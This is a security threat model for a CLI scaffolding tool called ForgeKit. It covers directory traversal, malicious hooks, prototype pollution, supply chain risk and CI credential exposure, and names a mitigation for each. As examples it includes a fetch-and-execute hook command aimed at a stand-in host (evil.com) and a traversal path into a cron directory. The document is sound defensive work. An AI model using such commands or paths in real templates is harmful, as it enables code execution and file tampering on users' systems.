# ForgeKit Threat Model

Last updated: 2026-03-22

## System Overview

ForgeKit is a CLI tool that:
1. Reads template manifests from a local `templates/` directory
2. Accepts user input (project name, template ID, output path)
3. Writes files to a user-specified output directory
4. Optionally executes post-scaffold hooks (e.g., `npm install`)

## Trust Boundaries

```
User Input → CLI Input Validation → Template Resolver → File Writer → User's File System
                                                       ↓
                                               Hook Executor → Shell
```

## Threat Analysis

### T1: Directory Traversal via Template Path
- **Threat:** A malicious template includes a file with `dest: "../../etc/cron.d/evil"`
- **Likelihood:** Medium (if community templates are accepted without review)
- **Impact:** Critical, arbitrary file write on user's system
- **Mitigation:** `validatePathContainment()` in `security.ts` checks every dest path against output root. Template manifests are reviewed by maintainers before merge.
- **Residual risk:** Low

### T2: Arbitrary Code Execution via Hook Command
- **Threat:** A template hook specifies `command: "bash"` with `args: ["-c", "curl evil.com | sh"]`
- **Likelihood:** Low (hooks are in reviewed template manifests)
- **Impact:** Critical, full RCE on user's system
- **Mitigation:** `validateHookCommand()` enforces allowlist: `[npm, npx, yarn, pnpm, pip, pip3, python, python3]`. Any other command is rejected.
- **Residual risk:** Low

### T3: Prototype Pollution via Handlebars Template
- **Threat:** Template variable names like `__proto__` pollute the context object
- **Likelihood:** Low
- **Impact:** Medium, could bypass security checks
- **Mitigation:** Handlebars escapes output by default. Variable names are validated via template manifest review.
- **Residual risk:** Low

### T4: Supply Chain Attack via npm Dependencies
- **Threat:** A dependency of `@forgekit/cli` is compromised (e.g., via a malicious update)
- **Likelihood:** Low-Medium (industry-wide risk)
- **Impact:** High, code runs on thousands of developer machines
- **Mitigation:** `npm audit` in CI blocks on high/critical. Lock file (`package-lock.json`) pinned. Gitleaks scans for accidentally committed secrets.
- **Residual risk:** Medium (industry-wide, no perfect solution)

### T5: Sensitive Data in Template Variables
- **Threat:** User provides a secret as a template variable (e.g., database password)
- **Likelihood:** Low (templates use `.env.example`, not real secrets)
- **Impact:** Medium, secret ends up in generated files committed to VCS
- **Mitigation:** Templates use `.env.example` with placeholder values. README instructs users never to put real credentials in template variables.
- **Residual risk:** Low

### T6: Malicious Template Contributed via PR
- **Threat:** A contributor submits a PR adding a template with a directory traversal or malicious hook
- **Likelihood:** Low (requires bypassing PR review)
- **Impact:** High, affects all users who scaffold with that template
- **Mitigation:** PR review required for all template changes. CI runs security scan on template manifests. DCO sign-off creates accountability trail.
- **Residual risk:** Low

### T7: Credential Exposure in CI/CD
- **Threat:** `NPM_TOKEN` or other CI secrets are exposed via log output or compromised runner
- **Likelihood:** Low
- **Impact:** High, could allow malicious publish to npm
- **Mitigation:** GitHub Actions secrets not printed to logs. Publish only on tagged releases. npm provenance attestation enabled.
- **Residual risk:** Low

## Security Controls Summary

| Control | Implementation | Coverage |
|---------|---------------|---------|
| Path containment | `validatePathContainment()` | T1 |
| Hook allowlist | `validateHookCommand()` | T2 |
| Dependency audit | `npm audit` in CI | T4 |
| Secret scanning | gitleaks in CI | T5 |
| Code review | PR review policy | T3, T6 |
| DCO sign-off | GitHub Action | T6 |
| Provenance | npm provenance on publish | T4 |

## Out of Scope (v0.1)

- Network security (CLI has no network access)
- Authentication (CLI operates as current user)
- Multi-user access control (single-user CLI)

These become relevant in future web dashboard and SaaS versions.
